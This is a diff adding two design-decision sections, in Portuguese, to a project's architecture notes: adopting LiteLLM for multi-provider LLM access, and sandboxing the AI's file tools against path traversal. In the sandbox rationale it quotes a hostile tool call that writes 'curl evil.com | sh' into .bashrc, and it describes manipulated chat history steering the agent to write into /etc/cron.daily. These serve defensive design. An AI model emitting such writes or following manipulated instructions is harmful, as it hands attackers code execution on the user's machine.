@@ -673,6 +673,100 @@ informação suficiente pra recuperar manualmente se precisar.
 
 ---
 
+## Multi-provider LLM via LiteLLM (Change 007)
+
+### Decisão
+
+Usar [LiteLLM](https://github.com/BerriAI/litellm) como camada de
+abstração para falar com OpenAI, Anthropic, Gemini, Ollama e Cohere
+na mesma interface. A config fica em `config/llm_config.json` (ou
+`~/Documents/ArchExplorer/llm_config.json`).
+
+### Por que LiteLLM
+
+Cada provider tem:
+- Esquema próprio de payload (OpenAI usa `messages[]`, Anthropic
+  também mas com `system` separado, Gemini usa `contents[]`).
+- Autenticação diferente (header `Authorization: Bearer` vs `x-api-key`
+  vs API key in body).
+- Streaming diferente (delta chunks vs completion chunks).
+- Erros diferentes (rate limit, context length, content filter).
+
+Reimplementar isso para 5 providers = ~3000 linhas de adapter
+code. LiteLLM abstrai tudo isso numa única chamada
+`litellm.completion(...)` e ainda adiciona retry, fallback e
+logging consistentes.
+
+### Por que como extra opcional (`[llm]`)
+
+LiteLLM puxa ~80 MB de deps transitivas (openai, anthropic, boto3,
+google-generativeai, etc). Para o usuário que só usa Ollama local,
+isso é lixo. Por isso:
+
+```toml
+[project.optional-dependencies]
+llm = ["litellm>=1.40"]
+```
+
+Quem não instala o extra recebe `LlmToolError("litellm_missing")` na
+primeira chamada com a instrução `pip install arch-explorer-ai[llm]`.
+
+### Custo
+
+~80 MB no venv + ~50ms de overhead por chamada (a lib faz um
+dispatch baseado no nome do modelo). Aceitável dado que economiza
+3k linhas de código e mantém a interface consistente.
+
+### Anti-decisão
+
+> ❌ **Reimplementar por provider.**
+
+Puro trabalho braçal sem ganho. Mesma justificativa da seção do
+Ollama acima — adapter + sandbox + chat já são nosso diferencial.
+
+---
+
+## Tool Use com sandbox estrito (Change 007)
+
+### Decisão
+
+Quando a IA invoca `create_file` / `create_directory` / `read_file` /
+`list_directory`, **toda** chamada passa por um
+:class:`FileSystemAgent` que valida:
+
+1. **Whitelist de caracteres** — `^[a-zA-Z0-9._/-]+$` (sem `..`,
+   `\\`, espaços, null bytes).
+2. **Path traversal** — `(workspace_root / rel_path).resolve()` deve
+   `relative_to(workspace_root.resolve())`. Bloqueia
+   `../etc/passwd`, `/etc/passwd`, `a/../../b`, etc.
+3. **Tamanho** — `create_file` rejeita >1 MiB.
+4. **Encoding** — `read_file` exige UTF-8.
+
+Violações viram `LlmToolError(reason=...)` que é **devolvido para
+a IA como resultado da tool**, permitindo autocorreção na próxima
+iteração do loop.
+
+### Por que estrito (não permissivo)
+
+O LLM é código não-confiável. Mesmo um prompt benigno
+("crie um README.md") pode virar
+("agora mova o README para /etc/cron.daily/") se o usuário
+manipular o histórico. A política padrão é **bloquear tudo que não
+tenha justificativa explícita** — se o usuário precisar de um path
+especial, ele pode abrir o FileSystemAgent em modo avançado.
+
+### Anti-decisão registrada
+
+> ❌ **Tool Use sem sandbox.**
+
+Caminho mais curto para RCE. Se a IA emitir
+`create_file('../../.bashrc', 'curl evil.com | sh')` e o app confiar,
+o sistema está comprometido. Bloquear por padrão e afrouxar sob
+demanda explícita é o pattern correto (igual a `sudo` vs `root` no
+Unix).
+
+---
+
 ## Resumo: tech radar
 
 | Categoria   | Adotado                          | Rejeitado                          |
